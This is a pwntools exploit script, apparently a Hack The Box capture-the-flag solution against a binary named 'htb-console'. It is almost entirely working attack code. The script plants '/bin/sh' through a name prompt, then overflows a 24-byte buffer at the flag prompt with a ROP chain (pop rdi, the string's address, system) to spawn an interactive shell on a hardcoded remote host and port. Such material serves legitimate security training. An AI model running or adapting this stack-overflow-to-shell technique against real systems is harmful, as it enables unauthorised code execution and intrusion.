#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./htb-console --host 127.0.0.1 --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./htb-console', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '188.166.171.200'
port = int(args.PORT or 32704)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# == Notes
# End of `execute_cmd`: 0x401396

io = start()

offset = 24
binsh_addr = 0x4040b0
system_addr = 0x401381
pop_rdi = 0x401473

pwn_payload = flat(
    b"A" * offset,
    pop_rdi,
    binsh_addr,
    system_addr
)

io.sendlineafter(b">> ", b"hof")
io.sendlineafter(b"Enter your name: ", b"/bin/sh")
io.sendlineafter(b">> ", b"flag")
io.sendlineafter(b"Enter flag: ", pwn_payload)

io.interactive()

